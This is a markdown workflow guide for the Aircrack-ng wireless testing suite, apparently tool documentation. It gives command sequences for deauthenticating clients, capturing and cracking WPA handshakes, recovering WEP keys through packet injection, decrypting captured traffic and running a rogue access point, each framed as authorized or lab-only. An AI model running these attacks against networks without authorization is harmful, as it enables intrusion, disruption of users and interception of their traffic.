# Aircrack-ng Workflows

Coordinated module sequences for **authorized** wireless assessments. Always start with adapter validation and `airmon-ng check kill`.

---

## Workflow 0: Hardware and driver validation

**Goal:** Confirm the adapter can scan before investing time in capture/crack.

```bash
iw dev                          # list interfaces
sudo airmon-ng                  # chipset / driver
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo aireplay-ng -9 wlan0mon    # injection test — expect "Injection is working!"
sudo airmon-ng stop wlan0mon
```

**If injection fails:** Try different USB adapter, driver, or USB port; do not proceed to disruptive attacks.

---

## Workflow 1: Passive RF survey (OSINT-friendly)

**Goal:** Discover SSIDs, BSSIDs, channels, encryption, clients — no injection.

| Step | Tool | Command |
|------|------|---------|
| 1 | airmon-ng | `check kill` → `start wlan0` |
| 2 | airodump-ng | `-w survey --output-format csv,pcap wlan0mon` |
| 3 | (wait) | 2–10 minutes channel hopping |
| 4 | stop | Ctrl+C; parse `survey-01.csv` |
| 5 | airmon-ng | `stop wlan0mon` |

**Outputs:** AP table + client table in CSV → [output-and-parsing.md](output-and-parsing.md) → `WIFI_ACCESS_POINT` nuggets.

**Optional:** `airgraph-ng -i survey-01.csv -o topology.png -a`

---

## Workflow 2: WPA/WPA2-PSK handshake capture

**Goal:** Obtain EAPOL 4-way handshake for offline dictionary attack.

**Reference:** [WPA capture tutorial](https://www.aircrack-ng.org/doku.php?id=wpa_capture)

| Step | Tool | Action |
|------|------|--------|
| 1 | airmon-ng | Monitor mode on |
| 2 | airodump-ng | Passive scan; identify target BSSID, channel, ESSID |
| 3 | airodump-ng | `-c <ch> --bssid <AP> -w wpa_capture wlan0mon` |
| 4 | (passive) | Wait for natural client association/reauth |
| 5 | aireplay-ng | **If authorized and stuck:** `-0 3 -a <AP> -c <CLIENT> wlan0mon` |
| 6 | airodump-ng | Confirm `WPA handshake: <BSSID>` in top status line |
| 7 | aircrack-ng | `-w wordlist.txt -b <BSSID> wpa_capture-01.cap` |

**Handshake indicators:**

- airodump-ng status: `WPA handshake: AA:BB:CC:DD:EE:FF`
- `aircrack-ng` shows `1 handshake` when reading cap

**Accelerators:**

- `wpaclean` to dedupe handshakes from noisy caps
- `airolib-ng` for large wordlists (see Workflow 4)

**PMKID (optional, not classic aircrack):** Some engagements use `hcxdumptool`/`hashcat` — outside core aircrack-ng but common in modern workflows.

---

## Workflow 3: WEP crack orchestration

**Goal:** Collect IVs and recover 64/128-bit WEP key (legacy lab only).

**References:**

- [Simple WEP crack](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack)
- [Flowchart](https://www.aircrack-ng.org/doku.php?id=flowchart)
- [No wireless clients](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)

### 3A: AP with active clients

| Step | Tool | Action |
|------|------|--------|
| 1 | airodump-ng | `-c <ch> --bssid <AP> -w wep wlan0mon` |
| 2 | aireplay-ng | Fake auth if needed: `-1 0 -e <ESSID> -a <AP> -h <MAC> wlan0mon` |
| 3 | aireplay-ng | ARP replay: `-3 -b <AP> -h <CLIENT> wlan0mon` |
| 4 | airodump-ng | Watch `#Data` and IV count rise |
| 5 | aircrack-ng | `wep-01.cap` (auto WEP) when IVs > ~10k (often less with PTW) |

### 3B: No clients on AP

| Step | Tool | Action |
|------|------|--------|
| 1 | aireplay-ng | Fake auth `-1` |
| 2 | aireplay-ng | Fragmentation `-5` or chopchop `-4` per tutorial |
| 3 | packetforge-ng | Build ARP packet |
| 4 | aireplay-ng | Interactive `-2` or ARP `-3` |
| 5 | aircrack-ng | Run when sufficient IVs |

### 3C: Clientless WEP (caffe-latte)

```bash
aireplay-ng -6 -h <CLIENT> -b <AP> wlan0mon   # authorized lab only
```

---

## Workflow 4: airolib-ng accelerated WPA crack

**Goal:** Precompute PMKs for ESSIDs + wordlist, then fast crack.

```bash
airolib-ng pmk_db --import essid /tmp/target_essids.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --clean all
airolib-ng pmk_db --batch
aircrack-ng -r pmk_db -b <BSSID> wpa_capture-01.cap
```

**When:** Wordlist > 1M entries or repeated cracks against same ESSIDs.

---

## Workflow 5: Decrypt and analyze

**After key recovery:**

```bash
airdecap-ng -e "<ESSID>" -p "<passphrase>" wpa_capture-01.cap
# → writes wpa_capture-01-dec.cap
```

Inspect with Wireshark/tshark for layer 7 OSINT (authorized scope only).

---

## Workflow 6: Rogue AP lab (airbase-ng)

**Goal:** Isolated test environment only.

```bash
sudo airbase-ng -e TestLab -c 6 wlan0mon
# bridge to wired / dhcp per lab design
```

Not for production or unauthorized impersonation.

---

## Workflow 7: Shared-key / hidden SSID edge cases

| Scenario | Path |
|----------|------|
| Hidden SSID | Capture probes from clients; use BSSID-focused airodump |
| Shared key auth WEP | [Shared key fake auth tutorial](https://www.aircrack-ng.org/doku.php?id=shared_key) |
| WDS links | `airodump-ng -D`; [WDS WEP tutorial](https://www.aircrack-ng.org/doku.php?id=wds) |
| IVs not increasing | [Injection troubleshooting](https://www.aircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase) |

---

## Teardown (every workflow)

```bash
# Ctrl+C running airodump/aireplay
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager   # if killed by check kill
```

---

## SpiderFeet integration note

No `sfp_tool_aircrack` module ships in core SpiderFeet today. Discovery workflow (Workflow 1) maps cleanly to `WIFI_ACCESS_POINT` via CSV parsing — see [nugget-mapping.md](nugget-mapping.md).
